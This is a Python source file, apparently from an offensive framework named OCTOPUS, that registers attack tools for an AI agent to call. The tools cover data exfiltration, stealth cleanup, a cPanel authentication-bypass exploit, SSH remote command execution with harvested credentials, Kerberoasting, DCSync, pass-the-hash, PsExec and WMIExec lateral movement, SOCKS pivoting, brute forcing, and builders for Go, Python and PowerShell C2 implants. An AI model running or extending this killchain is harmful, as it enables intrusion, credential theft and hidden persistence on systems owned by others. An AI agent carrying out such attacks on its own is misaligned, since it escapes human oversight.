@tool(name="killchain_exfil", aliases=["data_exfil", "exfil"], category="post", description="Killchain Data Exfiltration", requires=["python:paramiko"])
def ai_exfil(target_ip: str, user: str = None, pwd: str = None) -> str:
    user, pwd = _resolve_ai_creds(target_ip, user, pwd)
    from core.killchain import data_exfil
    return data_exfil(target_ip, user, pwd)

@tool(name="killchain_full", aliases=["full_killchain"], category="post", description="Run Full Killchain", requires=["python:paramiko"])
def ai_full_killchain(target_ip: str, user: str = None, pwd: str = None) -> str:
    user, pwd = _resolve_ai_creds(target_ip, user, pwd)
    from core.killchain import run_full_killchain
    return run_full_killchain(target_ip, user, pwd)

@tool(name="killchain_cleanup", aliases=["cleanup", "stealth_cleanup"], category="post", description="Stealth Cleanup", requires=["python:paramiko"])
def ai_stealth_cleanup(target_ip: str, user: str = None, pwd: str = None) -> str:
    user, pwd = _resolve_ai_creds(target_ip, user, pwd)
    from core.killchain import stealth_cleanup
    return stealth_cleanup(target_ip, user, pwd)

@tool(name="deploy_c2_beacon", aliases=["c2_beacon"], category="post", description="Deploy C2 Beacon")
def ai_deploy_c2_beacon(target_ip: str, user: str = None, pwd: str = None) -> str:
    user, pwd = _resolve_ai_creds(target_ip, user, pwd)
    from core.killchain import deploy_c2_beacon
    return deploy_c2_beacon(target_ip, user, pwd)

@tool(name="cpanel_exploit", aliases=["cve_2026_41940", "cpanel_auth_bypass"], category="post", description="CVE-2026-41940 cPanel Exploit")
def ai_cpanel_exploit(target: str, action: str = "cmd", cmd_arg: str = "id") -> str:
    try:
        from modules.exploits.cpanel_auth_bypass import CpanelSniper
        import json as _json
        sniper = CpanelSniper()
        result = sniper.exploit(target, action=action, cmd=cmd_arg)
        raw = result.pop("raw_output", "")
        out = f"[CVE-2026-41940 — {target}]\n" + _json.dumps(result, indent=2, default=str)
        if raw:
            out += f"\n\n─── RAW OUTPUT ───\n{raw}"
        return out
    except Exception as e:
        return f"[!] cPanel exploit error: {e}"

@tool(name="shodan", aliases=["shodan_search", "shodan_host", "shodan_vulns", "shodan_range"], category="recon", description="Shodan OSINT tool")
def ai_shodan_smart(query: str) -> str:
    try:
        from shodan_module import run_shodan_smart
        return run_shodan_smart(query)
    except ImportError:
        return "[!] shodan_module.py not found."

@tool(name="browser_surface_analysis", aliases=["browser_analyze", "browser_surface", "shardbrowser_browse"], category="recon", description="Render and summarize a target page with ShardBrowser.", requires=["octopus:shardbrowser"])
def ai_browser_surface_analysis(target: str, proto: str = "https", port: str = "", wait: float = 5) -> str:
    return _run_shardbrowser_direct(target, proto=proto, port=port, wait=wait, headless=True)

@tool(name="shardbrowser_osint", aliases=["browser_osint", "shard_osint", "shardbrowser"], category="recon", description="Run isolated ShardBrowser OSINT searches.", requires=["octopus:shardbrowser"])
def ai_shardbrowser_osint(query: str, engines: str = "", proxy: str = "") -> str:
    try:
        import json as _json
        from core.osint.shardbrowser import ShardBrowser
    except ImportError:
        return "[!] ShardBrowser module not found."

    sb = ShardBrowser()
    status = sb.get_status()
    if not status.get("installed"):
        return (f"[!] ShardBrowser not ready: {status.get('error', 'unknown')}\n"
                "Install deps: pip install httpx[socks] patchright")

    engine_list = [e.strip() for e in engines.split(",") if e.strip()] if engines else None
    try:
        results = sb.osint_target(query, engines=engine_list, proxy=proxy or None, headless=True)
        return f"[ShardX OSINT Search - {query}]\n" + _json.dumps(results, indent=2, default=str)
    except Exception as e:
        return f"[!] ShardX OSINT failed: {e}"

@tool(name="crack_hashes", aliases=["hash_crack", "crack", "hashcrack"], category="post", description="Hash Cracker")
def ai_crack_hashes(target: str) -> str:
    try:
        from hash_cracker import run_crack_hashes
        return run_crack_hashes(target)
    except ImportError:
        return "[!] hash_cracker.py not found."

@tool(name="ssh_session", aliases=["ssh-session", "sshsession"], category="post", description="Post-exploitation SSH Session", requires=["python:paramiko"])
def ai_ssh_session(host: str, user: str = None, pwd: str = None, port: int = 22) -> str:
    user, pwd = _resolve_ai_creds(host, user, pwd)
    if not user or not pwd:
        return f"[!] No SSH credentials known for {host}. Provide creds: ssh_session IP USER PASSWORD"
    return _ssh_analyze(host, user, pwd, port=port)

@tool(name="ssh_exec", aliases=["ssh-exec", "remote_exec"], category="post", description="Run a command through SSH using known or supplied credentials.", requires=["python:paramiko"])
def ai_ssh_exec(host: str, user: str = None, pwd: str = None, command: str = "", port: int = 22) -> str:
    command = _strip_wrapping_quotes(command)
    block_reason = _ssh_exec_block_reason(command)
    if block_reason:
        return f"[!] ssh_exec blocked: {block_reason}. Command: {command}"

    user, pwd = _resolve_ai_creds(host, user, pwd)
    if not user or not pwd:
        return f"[!] No SSH credentials known for {host}. Provide creds: ssh_exec IP USER PASSWORD 'command'"

    try:
        from core.killchain.ssh_helpers import _ssh_connect, _ssh_exec
    except ImportError as e:
        return f"[!] SSH helpers unavailable: {e}"

    client = None
    try:
        client, err = _ssh_connect(host, user, pwd, port=port, timeout=15)
        if err or client is None:
            return f"[!] SSH connection failed: {err or 'unknown error'}"
        register_credential("ssh", host, user, pwd)
        out = _ssh_exec(client, command, timeout=90)
        return f"[*] ssh_exec: {user}@{host}:{port}\n$ {command}\n{out}"
    finally:
        if client is not None:
            try:
                client.close()
            except Exception as _exc:
                logging.debug(f"Suppressed in post_tools.py: {_exc}")

@tool(name="ad_enum", aliases=["ad_enumerate"], category="post", description="Active Directory enumeration")
def ai_ad_enum(target_ip: str, user: str = None, pwd: str = None, domain: str = "") -> str:
    from core.killchain.ad.enumeration import run_ad_enum
    creds = _resolve_ad_creds(target_ip, user, pwd, domain)
    return run_ad_enum(target_ip, creds=creds if creds.get("user") or creds.get("domain") else None)

@tool(name="asrep_roast", aliases=["asrep"], category="post", description="AS-REP roasting")
def ai_asrep_roast(target_ip: str, user: str = None, pwd: str = None, domain: str = "") -> str:
    from core.killchain.ad.kerberos import asrep_roast
    creds = _resolve_ad_creds(target_ip, user, pwd, domain)
    return asrep_roast(target_ip, creds=creds if creds.get("domain") else None)

@tool(name="kerberoast", aliases=["kerberoasting"], category="post", description="Kerberoasting")
def ai_kerberoast(target_ip: str, user: str = None, pwd: str = None, domain: str = "") -> str:
    from core.killchain.ad.kerberos import kerberoast
    creds = _resolve_ad_creds(target_ip, user, pwd, domain)
    if not creds.get("user"):
        return "[!] Kerberoasting requires valid domain credentials."
    return kerberoast(target_ip, creds)

@tool(name="dcsync", aliases=["dc_sync"], category="post", description="DCSync with domain credentials")
def ai_dcsync(target_ip: str, user: str = None, pwd: str = None, domain: str = "") -> str:
    from core.killchain.ad.credential import dcsync
    creds = _resolve_ad_creds(target_ip, user, pwd, domain)
    if not creds.get("user") or not creds.get("domain"):
        return "[!] DCSync requires domain credentials."
    return dcsync(target_ip, creds)

@tool(name="pass_the_hash", aliases=["pth"], category="post", description="Pass-the-Hash authentication")
def ai_pass_the_hash(target_ip: str, user: str = "", nthash: str = "", domain: str = "") -> str:
    if not user or not nthash:
        return "[!] Pass-the-Hash requires target, user and NT hash."
    from core.killchain.ad.credential import pass_the_hash
    return pass_the_hash(target_ip, user, nthash, domain=domain or "")

@tool(name="psexec", aliases=["ps_exec"], category="post", description="PsExec lateral movement")
def ai_psexec(target_ip: str, user: str = None, pwd: str = None,
              domain: str = "", command: str = "whoami && hostname && ipconfig") -> str:
    from core.killchain.ad.lateral import psexec
    creds = _resolve_ad_creds(target_ip, user, pwd, domain)
    if not creds.get("user"):
        return "[!] PsExec requires valid credentials."
    return psexec(target_ip, creds, command=_strip_wrapping_quotes(command))

@tool(name="wmiexec", aliases=["wmi_exec"], category="post", description="WMIExec lateral movement")
def ai_wmiexec(target_ip: str, user: str = None, pwd: str = None,
               domain: str = "", command: str = "whoami && hostname && ipconfig") -> str:
    from core.killchain.ad.lateral import wmiexec
    creds = _resolve_ad_creds(target_ip, user, pwd, domain)
    if not creds.get("user"):
        return "[!] WMIExec requires valid credentials."
    return wmiexec(target_ip, creds, command=_strip_wrapping_quotes(command))

@tool(name="socks_proxy", aliases=["socks"], category="post", description="Start a SOCKS proxy through SSH", requires=["python:paramiko"])
def ai_socks_proxy(target_ip: str, user: str = None, pwd: str = None, local_port: int = 1080) -> str:
    client, _user, _pwd, err = _connect_ssh_for_tool(target_ip, user, pwd)
    if err:
        return err
    try:
        from core.killchain.pivot import setup_socks_proxy
        result = setup_socks_proxy(client, local_port=int(local_port))
        _PIVOT_SSH_CLIENTS.append(client)
        return result
    except Exception:
        client.close()
        raise

@tool(name="port_forward", aliases=["local_forward"], category="post", description="Create a local SSH port forward", requires=["python:paramiko"])
def ai_port_forward(target_ip: str, local_port: int = 8080,
                    remote_host: str = "127.0.0.1", remote_port: int = 80,
                    user: str = None, pwd: str = None) -> str:
    if isinstance(remote_host, str) and ":" in remote_host and int(remote_port) == 80:
        host_part, port_part = remote_host.rsplit(":", 1)
        if port_part.isdigit():
            remote_host = host_part
            remote_port = int(port_part)
    client, _user, _pwd, err = _connect_ssh_for_tool(target_ip, user, pwd)
    if err:
        return err
    try:
        from core.killchain.pivot import setup_local_forward
        result = setup_local_forward(client, int(local_port), remote_host, int(remote_port))
        _PIVOT_SSH_CLIENTS.append(client)
        return result
    except Exception:
        client.close()
        raise

@tool(name="network_recon", aliases=["pivot_netinfo"], category="post", description="Discover internal networks through SSH", requires=["python:paramiko"])
def ai_network_recon(target_ip: str, user: str = None, pwd: str = None) -> str:
    client, _user, _pwd, err = _connect_ssh_for_tool(target_ip, user, pwd)
    if err:
        return err
    try:
        from core.killchain.pivot import get_network_info
        return get_network_info(client)
    finally:
        client.close()

@tool(name="stealth_brute", aliases=["stealth_bruteforce"], category="exploit", description="Alias for the built-in adaptive bruteforce tool")
def ai_stealth_brute(service: str, target: str) -> str:
    from core.tools.exploit_tools import run_bruteforce
    return run_bruteforce(service, target)

@tool(name="build_go_implant", aliases=["build_go"], category="post", description="Build the Go C2 implant")
def ai_build_go_implant(c2_url: str = "http://127.0.0.1:8443",
                        os_target: str = "linux", arch_target: str = "amd64") -> str:
    try:
        from core.c2.builder import build_implant
        result = build_implant(os_target=os_target, arch_target=arch_target, c2_urls=c2_url)
        return result or "[+] Go implant build finished."
    except SystemExit as e:
        return f"[!] Go implant build aborted: {e}"

@tool(name="build_python_implant", aliases=["build_py_implant"], category="post", description="Generate the Python C2 implant")
def ai_build_python_implant(c2_url: str = "http://127.0.0.1:8443",
                            beacon_interval: int = 60) -> str:
    from core.c2.implants.python_implant import generate_python_implant
    code = generate_python_implant(c2_urls=[c2_url], beacon_interval=int(beacon_interval))
    path = _write_generated_artifact("implant_python.py", code)
    return f"[+] Python implant generated: {path}\nSize: {len(code)} bytes\nC2: {c2_url}"

@tool(name="build_ps_stager", aliases=["build_powershell_stager"], category="post", description="Generate a PowerShell C2 stager")
def ai_build_ps_stager(c2_url: str = "http://127.0.0.1:8443", method: str = "iex") -> str:
    from core.c2.implants.powershell_stager import generate_ps_encoded, generate_ps_stager
    code = generate_ps_encoded(c2_url) if method == "encoded" else generate_ps_stager(c2_url, method=method)
    path = _write_generated_artifact("stager.ps1", code)
    return f"[+] PowerShell stager generated: {path}\nC2: {c2_url}"

@tool(name="waf_detect", aliases=["detect_waf", "waf"], category="recon", description="Detect WAF/Firewall")
def ai_waf_detect(target_ip: str) -> str:
    return _run_waf_detect(target_ip)

@tool(name="searchsploit", category="recon", description="Search exploit-db", requires=["searchsploit"])
def ai_searchsploit(query: str) -> str:
    return run_tool(["searchsploit", "--color"] + query.split(), timeout=60)

@tool(name="plugin", aliases=["run_plugin", "octopus_plugin"], category="util", description="Run a class-based OCTOPUS plugin by name.")
def ai_run_plugin(plugin_name: str, target: str = "", action: str = "scan") -> str:
    """Execute PluginManager plugins through the tool registry.

    Default action is intentionally check/scan-oriented. Exploit-style actions
    must be exposed by the plugin itself with an explicit allow flag.
    """
    try:
        import json as _json
        from core.plugins.base import PluginContext
        from core.plugins.loader import PluginManager
    except ImportError as e:
        return f"[!] Plugin system unavailable: {e}"

    manager = PluginManager("modules/")
    if plugin_name in ("list", "ls", "summary"):
        return _json.dumps(manager.list_plugins(), indent=2, default=str)

    if not manager.get_plugin(plugin_name):
        available = ", ".join(sorted(manager.plugins)) or "none"
        return f"[!] Plugin '{plugin_name}' not found. Available: {available}"

    ctx = PluginContext(target=target or "")
    result = manager.execute(
        plugin_name,
        context=ctx,
        target=target,
        action=action or "scan",
        timeout=60,
    )
    payload = {
        "plugin": plugin_name,
        "success": result.success,
        "data": result.data,
        "artifacts": result.artifacts,
        "credentials": result.credentials,
        "sessions": result.sessions,
        "error": result.error,
    }
    output = _json.dumps(payload, indent=2, default=str)
    if result.output:
        output += f"\n\n--- plugin output ---\n{result.output[:4000]}"
    return output
